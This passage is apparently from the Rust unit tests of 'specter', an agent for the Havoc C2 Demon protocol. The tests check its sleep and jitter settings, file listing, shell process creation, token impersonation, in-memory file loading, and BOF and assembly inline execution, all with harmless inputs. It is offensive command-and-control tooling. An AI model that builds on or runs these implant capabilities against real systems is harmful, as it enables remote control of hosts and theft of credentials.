        // First u32 LE in payload must be DemonCallback::ErrorMessage (0x0d).
        let callback_type =
            u32::from_le_bytes(resp.payload[0..4].try_into().expect("callback type u32"));
        assert_eq!(
            callback_type,
            u32::from(DemonCallback::ErrorMessage),
            "callback type must be ErrorMessage (0x0d)"
        );
        // The text payload must mention the command name.
        let text_len =
            u32::from_le_bytes(resp.payload[4..8].try_into().expect("text len u32")) as usize;
        let text = std::str::from_utf8(&resp.payload[8..8 + text_len]).expect("utf8 text");
        assert!(
            text.contains("specter does not implement"),
            "error text must mention 'specter does not implement', got: {text:?}"
        );
        assert!(
            text.contains("DemonInfo"),
            "error text must include the command name, got: {text:?}"
        );
    }

    // ── handle_sleep edge cases ──────────────────────────────────────────────

    #[test]
    fn handle_sleep_zero_delay_and_zero_jitter() {
        let mut config = SpecterConfig::default();
        config.sleep_delay_ms = 1000; // non-zero initial
        config.sleep_jitter = 50;
        let payload = le_u32_pair(0, 0);
        let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
        dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert_eq!(config.sleep_delay_ms, 0);
        assert_eq!(config.sleep_jitter, 0);
    }

    #[test]
    fn handle_sleep_max_u32_delay() {
        let mut config = SpecterConfig::default();
        let payload = le_u32_pair(u32::MAX, 100);
        let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert_eq!(config.sleep_delay_ms, u32::MAX);
        assert_eq!(config.sleep_jitter, 100);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        let echoed_delay = u32::from_le_bytes(resp.payload[0..4].try_into().expect("delay"));
        assert_eq!(echoed_delay, u32::MAX);
    }

    // ── handle_fs_cd edge cases ──────────────────────────────────────────────

    #[test]
    fn handle_fs_cd_nonexistent_directory_returns_ignore() {
        let mut config = SpecterConfig::default();
        let mut payload = le_subcmd(4); // Cd = 4
        payload.extend_from_slice(&le_utf16le_payload("/nonexistent_dir_xyz_99999"));
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(
            matches!(result, DispatchResult::Ignore),
            "cd to nonexistent directory must return Ignore"
        );
    }

    // ── handle_fs_dir edge cases ─────────────────────────────────────────────

    #[test]
    fn handle_fs_dir_nonexistent_path_returns_ignore() {
        let payload = dir_request_payload(
            "/nonexistent_dir_xyz_99999",
            false,
            false,
            false,
            false,
            "",
            "",
            "",
        );
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(
            matches!(result, DispatchResult::Ignore),
            "dir on nonexistent path must return Ignore"
        );
    }

    #[test]
    fn handle_fs_dir_files_only_excludes_directories() {
        let dir = std::env::temp_dir();
        let base = dir.join(format!("specter_dir_fonly_{}", rand::random::<u32>()));
        std::fs::create_dir_all(&base).expect("create base dir");
        // Create a file and a subdirectory.
        std::fs::write(base.join("file.txt"), b"hello").expect("write file");
        std::fs::create_dir(base.join("subdir")).expect("create subdir");

        let payload = dir_request_payload(
            &base.display().to_string(),
            false,
            true, // files_only
            false,
            true, // list_only (simpler output)
            "",
            "",
            "",
        );
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond for dir listing");
        };
        // Verify the response payload doesn't contain "subdir".
        // The response uses UTF-16LE encoding, so search for "subdir" encoded.
        let subdir_utf16: Vec<u8> = "subdir".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        assert!(
            !resp.payload.windows(subdir_utf16.len()).any(|w| w == subdir_utf16.as_slice()),
            "files_only must exclude directory entries"
        );
        let file_utf16: Vec<u8> = "file.txt".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        assert!(
            resp.payload.windows(file_utf16.len()).any(|w| w == file_utf16.as_slice()),
            "files_only must include file entries"
        );
        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn handle_fs_dir_dirs_only_excludes_files() {
        let dir = std::env::temp_dir();
        let base = dir.join(format!("specter_dir_donly_{}", rand::random::<u32>()));
        std::fs::create_dir_all(&base).expect("create base dir");
        std::fs::write(base.join("file.txt"), b"hello").expect("write file");
        std::fs::create_dir(base.join("subdir")).expect("create subdir");

        let payload = dir_request_payload(
            &base.display().to_string(),
            false,
            false,
            true, // dirs_only
            true, // list_only
            "",
            "",
            "",
        );
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond for dir listing");
        };
        let file_utf16: Vec<u8> = "file.txt".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        assert!(
            !resp.payload.windows(file_utf16.len()).any(|w| w == file_utf16.as_slice()),
            "dirs_only must exclude file entries"
        );
        let subdir_utf16: Vec<u8> = "subdir".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        assert!(
            resp.payload.windows(subdir_utf16.len()).any(|w| w == subdir_utf16.as_slice()),
            "dirs_only must include directory entries"
        );
        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn handle_fs_dir_name_filter_starts_with() {
        let dir = std::env::temp_dir();
        let base = dir.join(format!("specter_dir_filter_{}", rand::random::<u32>()));
        std::fs::create_dir_all(&base).expect("create base dir");
        std::fs::write(base.join("alpha.txt"), b"a").expect("write alpha");
        std::fs::write(base.join("beta.txt"), b"b").expect("write beta");

        let payload = dir_request_payload(
            &base.display().to_string(),
            false,
            false,
            false,
            true, // list_only
            "alpha",
            "",
            "",
        );
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond for dir listing");
        };
        let alpha_utf16: Vec<u8> =
            "alpha.txt".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        assert!(
            resp.payload.windows(alpha_utf16.len()).any(|w| w == alpha_utf16.as_slice()),
            "starts_with filter must include matching entries"
        );
        let beta_utf16: Vec<u8> = "beta.txt".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        assert!(
            !resp.payload.windows(beta_utf16.len()).any(|w| w == beta_utf16.as_slice()),
            "starts_with filter must exclude non-matching entries"
        );
        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn handle_fs_unknown_subcommand_returns_ignore() {
        let mut config = SpecterConfig::default();
        let payload = le_subcmd(0xFF_FF); // bogus subcommand
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn handle_fs_empty_payload_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, vec![]);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── handle_proc edge cases ───────────────────────────────────────────────

    #[test]
    fn handle_proc_create_captures_stderr() {
        let mut config = SpecterConfig::default();
        // Run a command that writes to stderr.
        let mut payload = Vec::new();
        payload.extend_from_slice(&le_subcmd(u32::from(DemonProcessCommand::Create)));
        payload.extend_from_slice(&0u32.to_le_bytes()); // process_state
        payload.extend_from_slice(&le_utf16le_payload("")); // process_path (empty → /bin/sh)
        payload.extend_from_slice(&le_utf16le_payload("/c echo stderr_test >&2"));
        payload.extend_from_slice(&1u32.to_le_bytes()); // piped = true
        payload.extend_from_slice(&0u32.to_le_bytes()); // verbose = false
        let package = DemonPackage::new(DemonCommand::CommandProc, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        let DispatchResult::MultiRespond(responses) = result else {
            panic!("expected MultiRespond for proc create");
        };
        assert_eq!(responses.len(), 2, "proc create returns 2 responses");
        // Second response is CommandOutput with captured output.
        let output_resp = &responses[1];
        assert_eq!(output_resp.command_id, u32::from(DemonCommand::CommandOutput));
        // Parse the output payload (LE length-prefixed bytes).
        let output_len =
            u32::from_le_bytes(output_resp.payload[0..4].try_into().expect("len")) as usize;
        let output_bytes = &output_resp.payload[4..4 + output_len];
        let output_str = String::from_utf8_lossy(output_bytes);
        assert!(
            output_str.contains("stderr_test"),
            "proc create must capture stderr — got: {output_str}"
        );
    }

    #[test]
    fn handle_proc_create_nonzero_exit_code_still_succeeds() {
        let mut config = SpecterConfig::default();
        let mut payload = Vec::new();
        payload.extend_from_slice(&le_subcmd(u32::from(DemonProcessCommand::Create)));
        payload.extend_from_slice(&0u32.to_le_bytes()); // process_state
        payload.extend_from_slice(&le_utf16le_payload("")); // process_path
        payload.extend_from_slice(&le_utf16le_payload("/c exit 42"));
        payload.extend_from_slice(&1u32.to_le_bytes()); // piped
        payload.extend_from_slice(&0u32.to_le_bytes()); // verbose
        let package = DemonPackage::new(DemonCommand::CommandProc, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        // Even with a non-zero exit code, the handler should return MultiRespond
        // (the process ran, it just exited non-zero).
        let DispatchResult::MultiRespond(responses) = result else {
            panic!("expected MultiRespond for proc create with non-zero exit");
        };
        assert_eq!(responses.len(), 2);

        // Verify the trailing i32 exit code is encoded in the CommandOutput payload.
        let out_resp = &responses[1];
        assert_eq!(out_resp.command_id, u32::from(DemonCommand::CommandOutput));
        let out_payload = &out_resp.payload;
        let str_len = u32::from_le_bytes(out_payload[0..4].try_into().expect("len")) as usize;
        let exit_code_start = 4 + str_len;
        assert!(
            out_payload.len() >= exit_code_start + 4,
            "CommandOutput payload must include trailing exit code i32"
        );
        let exit_code = i32::from_le_bytes(
            out_payload[exit_code_start..exit_code_start + 4].try_into().expect("exit code bytes"),
        );
        assert_eq!(exit_code, 42, "exit code must be 42");
    }

    #[test]
    fn handle_proc_empty_payload_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandProc, 1, vec![]);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn handle_proc_unknown_subcommand_returns_ignore() {
        let mut config = SpecterConfig::default();
        let payload = le_subcmd(0xFFFF); // bogus subcommand
        let package = DemonPackage::new(DemonCommand::CommandProc, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn handle_proc_grep_matches_self_pid() {
        let mut config = SpecterConfig::default();
        // Use empty needle (matches all).
        let mut payload = Vec::new();
        payload.extend_from_slice(&le_subcmd(u32::from(DemonProcessCommand::Grep)));
        payload.extend_from_slice(&le_utf16le_payload(""));
        let package = DemonPackage::new(DemonCommand::CommandProc, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond for proc grep");
        };
        // Parse response: subcmd(4) + repeated entries.
        // Each entry contains a PID field. Verify our PID is in there.
        assert!(resp.payload.len() > 4, "proc grep with empty needle should return entries");
    }

    // ── handle_proc_list edge cases ──────────────────────────────────────────

    #[test]
    fn handle_proc_list_empty_payload_uses_default_flag() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandProcList, 1, vec![]);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        // ProcList should still respond even with empty payload (uses default process_ui = 0).
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    // ── handle_net edge cases ────────────────────────────────────────────────

    #[test]
    fn dispatch_routes_command_net_empty_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandNet, 1, vec![]);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── handle_ps_import edge cases ──────────────────────────────────────────

    #[test]
    fn ps_import_accumulates_across_multiple_imports() {
        let mut config = SpecterConfig::default();
        let mut ps_scripts = Vec::new();
        let mut mem_files: MemFileStore = HashMap::new();

        // First import
        let script1 = b"function Get-Foo { 'foo' }\n";
        let mut payload1 = (script1.len() as u32).to_le_bytes().to_vec();
        payload1.extend_from_slice(script1);
        let package1 = DemonPackage::new(DemonCommand::CommandPsImport, 1, payload1);
        let _ = dispatch(
            &package1,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut mem_files,
            &mut JobStore::new(),
            &mut ps_scripts,
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert_eq!(ps_scripts.len(), script1.len());

        // Second import — should replace (not accumulate).
        let script2 = b"function Get-Bar { 'bar' }\n";
        let mut payload2 = (script2.len() as u32).to_le_bytes().to_vec();
        payload2.extend_from_slice(script2);
        let package2 = DemonPackage::new(DemonCommand::CommandPsImport, 2, payload2);
        let _ = dispatch(
            &package2,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut mem_files,
            &mut JobStore::new(),
            &mut ps_scripts,
            &crate::coffeeldr::new_bof_output_queue(),
        );
        // After second import, the stored script should be the second one.
        assert_eq!(ps_scripts.len(), script2.len());
    }

    // ── handle_token edge cases ──────────────────────────────────────────────

    #[test]
    fn token_impersonate_valid_id_on_non_windows_returns_failure() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        // Add a token entry manually (on non-Windows it's a stub).
        use crate::token::{TokenEntry, TokenType};
        vault.add(TokenEntry {
            handle: 0,
            domain_user: "DOMAIN\\user".into(),
            process_id: 0,
            token_type: TokenType::Stolen,
            credentials: None,
        });

        let mut payload = Vec::new();
        payload.extend_from_slice(&1u32.to_le_bytes()); // subcommand = Impersonate (= 1)
        payload.extend_from_slice(&0u32.to_le_bytes()); // vault index = 0
        let package = DemonPackage::new(DemonCommand::CommandToken, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        // On non-Windows, impersonation fails because there's no real handle.
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    // ── handle_memfile edge cases ────────────────────────────────────────────

    #[test]
    fn memfile_zero_size_completes_immediately() {
        let mut config = SpecterConfig::default();
        let mut mem_files: MemFileStore = HashMap::new();

        // Send a memfile with expected_size=0 and empty data.
        let mut payload = Vec::new();
        payload.extend_from_slice(&1u32.to_le_bytes()); // file_id = 1
        payload.extend_from_slice(&0u64.to_le_bytes()); // expected_size = 0 (u64)
        payload.extend_from_slice(&0u32.to_le_bytes()); // chunk_len = 0
        let package = DemonPackage::new(DemonCommand::CommandMemFile, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut mem_files,
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        // Zero-size memfile should return an ack response and be stored.
        assert!(matches!(result, DispatchResult::Respond(_)));
        assert!(mem_files.contains_key(&1));
    }

    // ── handle_inline_execute edge cases ─────────────────────────────────────

    #[test]
    fn dispatch_routes_command_inline_execute() {
        let mut config = SpecterConfig::default();
        // Minimal payload that will fail parsing (too short).
        let package = DemonPackage::new(DemonCommand::CommandInlineExecute, 1, vec![0x00]);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        // Short payload → returns CouldNotRun response.
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    /// Build a minimal InlineExecute payload with the given `flags` value.
    ///
    /// Does NOT insert a BOF memfile — the handler will return CouldNotRun
    /// when the memfile is missing.  Used to test error-path behaviour.
    fn inline_execute_payload_no_memfile(flags: i32) -> Vec<u8> {
        let mut payload = Vec::new();
        let func = b"go\0";
        payload.extend_from_slice(&(func.len() as u32).to_le_bytes());
        payload.extend_from_slice(func);
        payload.extend_from_slice(&1u32.to_le_bytes()); // bof_file_id = 1 (absent)
        payload.extend_from_slice(&2u32.to_le_bytes()); // params_file_id = 2
        payload.extend_from_slice(&flags.to_le_bytes());
        payload
    }

    /// Insert a complete BOF memfile into `mem_files` by dispatching a
    /// `CommandMemFile` packet.
    fn insert_complete_memfile(mem_files: &mut MemFileStore, file_id: u32, data: Vec<u8>) {
        let mut config = SpecterConfig::default();
        let mut payload = Vec::new();
        payload.extend_from_slice(&file_id.to_le_bytes());
        payload.extend_from_slice(&(data.len() as u64).to_le_bytes());
        payload.extend_from_slice(&(data.len() as u32).to_le_bytes());
        payload.extend_from_slice(&data);
        let pkg = DemonPackage::new(DemonCommand::CommandMemFile, 1, payload);
        let _ = dispatch(
            &pkg,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            mem_files,
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
    }

    #[test]
    fn inline_execute_threaded_missing_bof_returns_could_not_run() {
        // When the BOF memfile is absent, threaded mode still returns an error
        // and registers no job in the store.
        let mut config = SpecterConfig::default();
        let mut mem_files: MemFileStore = HashMap::new();
        let mut job_store = JobStore::new();

        let package = DemonPackage::new(
            DemonCommand::CommandInlineExecute,
            1,
            inline_execute_payload_no_memfile(1), // flags=1 → threaded
        );
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut mem_files,
            &mut job_store,
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
        assert_eq!(job_store.list().count(), 0, "no job should be registered on error");
    }

    #[test]
    fn inline_execute_nonthreaded_does_not_register_job() {
        // flags=0 (sync) with a garbage BOF: runs sync, returns BOF_COULD_NOT_RUN,
        // and leaves the job store empty.
        let mut config = SpecterConfig::default();
        let mut mem_files: MemFileStore = HashMap::new();
        let mut job_store = JobStore::new();

        insert_complete_memfile(&mut mem_files, 10, vec![0xDE, 0xAD]); // garbage COFF

        let mut payload = Vec::new();
        let func = b"go\0";
        payload.extend_from_slice(&(func.len() as u32).to_le_bytes());
        payload.extend_from_slice(func);
        payload.extend_from_slice(&10u32.to_le_bytes()); // bof_file_id = 10
        payload.extend_from_slice(&11u32.to_le_bytes()); // params_file_id = 11 (absent → empty)
        payload.extend_from_slice(&0i32.to_le_bytes()); // flags = 0 → non-threaded

        let package = DemonPackage::new(DemonCommand::CommandInlineExecute, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut mem_files,
            &mut job_store,
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
        assert_eq!(job_store.list().count(), 0, "sync BOF must not register a job");
    }

    #[cfg(not(windows))]
    #[test]
    fn inline_execute_threaded_non_windows_falls_back_to_sync() {
        // On non-Windows the threaded path is a no-op stub; execution falls
        // back to sync, returns BOF_COULD_NOT_RUN, and no job is registered.
        let mut config = SpecterConfig::default();
        let mut mem_files: MemFileStore = HashMap::new();
        let mut job_store = JobStore::new();

        insert_complete_memfile(&mut mem_files, 20, vec![0xDE, 0xAD]); // garbage COFF

        let mut payload = Vec::new();
        let func = b"go\0";
        payload.extend_from_slice(&(func.len() as u32).to_le_bytes());
        payload.extend_from_slice(func);
        payload.extend_from_slice(&20u32.to_le_bytes()); // bof_file_id = 20
        payload.extend_from_slice(&21u32.to_le_bytes()); // params_file_id = 21 (absent → empty)
        payload.extend_from_slice(&1i32.to_le_bytes()); // flags = 1 → threaded

        let package = DemonPackage::new(DemonCommand::CommandInlineExecute, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut mem_files,
            &mut job_store,
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        // Non-Windows sync fallback → returns BOF_COULD_NOT_RUN response
        assert!(matches!(result, DispatchResult::Respond(_)));
        // No job registered — threaded BOF unsupported on non-Windows
        assert_eq!(job_store.list().count(), 0);
    }

    #[cfg(not(windows))]
    #[test]
    fn inline_execute_threaded_non_windows_output_queue_stays_empty() {
        // On non-Windows the threaded stub returns None, so no callbacks should
        // appear in the output queue — the sync fallback produces an immediate
        // response instead.
        let mut config = SpecterConfig::default();
        let mut mem_files: MemFileStore = HashMap::new();
        let mut job_store = JobStore::new();
        let queue = crate::coffeeldr::new_bof_output_queue();

        insert_complete_memfile(&mut mem_files, 30, vec![0xDE, 0xAD]);

        let mut payload = Vec::new();
        let func = b"go\0";
        payload.extend_from_slice(&(func.len() as u32).to_le_bytes());
        payload.extend_from_slice(func);
        payload.extend_from_slice(&30u32.to_le_bytes());
        payload.extend_from_slice(&31u32.to_le_bytes());
        payload.extend_from_slice(&1i32.to_le_bytes()); // flags = 1 → threaded

        let package = DemonPackage::new(DemonCommand::CommandInlineExecute, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut mem_files,
            &mut job_store,
            &mut Vec::new(),
            &queue,
        );
        // Sync fallback returns a response
        assert!(matches!(result, DispatchResult::Respond(_)));
        // Queue must remain empty — no threaded execution occurred
        assert!(queue.lock().expect("lock").is_empty());
    }

    #[test]
    fn dispatch_routes_command_ps_import() {
        let mut config = SpecterConfig::default();
        // Empty script (0-length).
        let payload = 0u32.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandPsImport, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        // Empty script returns error response.
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    #[test]
    fn dispatch_routes_command_assembly_inline_execute() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandAssemblyInlineExecute, 1, vec![0x00]);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        // Short payload → returns error response.
        assert!(matches!(result, DispatchResult::Respond(_)));
    }
}
